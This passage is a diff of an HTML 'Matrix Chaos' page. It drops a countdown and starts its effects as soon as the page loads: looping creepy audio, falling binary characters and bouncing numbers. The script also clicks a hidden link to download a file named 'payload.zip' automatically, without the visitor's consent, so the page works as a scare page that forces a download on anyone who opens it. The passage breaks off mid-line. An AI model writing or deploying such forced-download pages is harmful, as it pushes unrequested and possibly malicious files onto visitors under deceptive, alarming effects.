@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Countdown Glitch</title>
+  <title>Matrix Chaos</title>
   <style>
     html, body {
       margin: 0;
@@ -12,72 +12,55 @@
       background: #000;
       color: #fff;
       font-family: monospace;
-      display: flex;
-      align-items: center;
-      justify-content: center;
       overflow: hidden;
-    }
-
-    #countdown {
-      font-size: 5rem;
-      font-weight: bold;
-      color: red;
-      animation: flash 0.5s infinite;
-    }
-
-    @keyframes flash {
-      0%   { opacity: 1; }
-      50%  { opacity: 0.2; }
-      100% { opacity: 1; }
     }
 
     canvas {
       position: absolute;
       top: 0;
       left: 0;
+      display: block;
     }
   </style>
 </head>
 <body>
-  <div id="countdown">60</div>
 
   <audio id="creepysound" src="creepy.mp3" preload="auto"></audio>
 
   <script>
-    let timeLeft = 60;
-    const countdownEl = document.getElementById('countdown');
-    const sound = document.getElementById('creepysound');
-
-    const timer = setInterval(() => {
-      timeLeft--;
-      countdownEl.textContent = timeLeft;
-
-      if (timeLeft <= 0) {
-        clearInterval(timer);
-        startMatrix();
-      }
-    }, 1000);
-
-    function startMatrix() {
+    window.onload = () => {
+      const sound = document.getElementById('creepysound');
       sound.loop = true;
+
+      // Try autoplay
       sound.play().catch(() => {
-        countdownEl.textContent = "Click to begin";
-        countdownEl.style.cursor = "pointer";
-        countdownEl.onclick = () => {
+        // If blocked, require click
+        const msg = document.createElement("div");
+        msg.textContent = "Click to begin";
+        msg.style.position = "absolute";
+        msg.style.top = "50%";
+        msg.style.left = "50%";
+        msg.style.transform = "translate(-50%, -50%)";
+        msg.style.fontSize = "3rem";
+        msg.style.color = "red";
+        msg.style.cursor = "pointer";
+        document.body.appendChild(msg);
+
+        msg.onclick = () => {
           sound.play();
-          countdownEl.onclick = null;
-          beginMatrix();
+          msg.remove();
+          startMatrix();
         };
         return;
       });
 
-      beginMatrix();
-    }
+      startMatrix();
+    };
 
-    function beginMatrix() {
-      // 🔥 AUTO-DOWNLOAD ZIP FILE
+    function startMatrix() {
+      // Auto-download ZIP
       const link = document.createElement('a');
-      link.href = 'payload.zip';   // your ZIP file
+      link.href = 'payload.zip';
       link.download = 'payload.zip';
       document.body.appendChild(link);
       link.click();
@@ -91,35 +74,20 @@
       const ctx = canvas.getContext("2d");
       document.body.appendChild(canvas);
 
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
+      function resize() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resize);
+      resize();
 
       const fontSize = 16;
-      const columns = Math.floor(canvas.width / fontSize);
+      let columns = Math.floor(canvas.width / fontSize);
+      let drops = Array(columns).fill(0);
 
-      const drops = Array(columns).fill(0);
-
-      function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-        ctx.fillStyle = "#fff";
-        ctx.font = fontSize + "px monospace";
-
-        for (let i = 0; i < drops.length; i++) {
-          const text = Math.random() > 0.5 ? "1" : "0";
-          ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-          if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-            drops[i] = 0;
-          }
-
-          drops[i]++;
-        }
-      }
-
-      setInterval(draw, 50);
-    }
-  </script>
-</body>
-</html>
+      // Bouncing numbers
+      const bouncers = [];
+      const numBouncers = 4;
+      for (let i = 0; i < numBouncers; i++) {
+        bouncers.push({
+          x: Math.random()
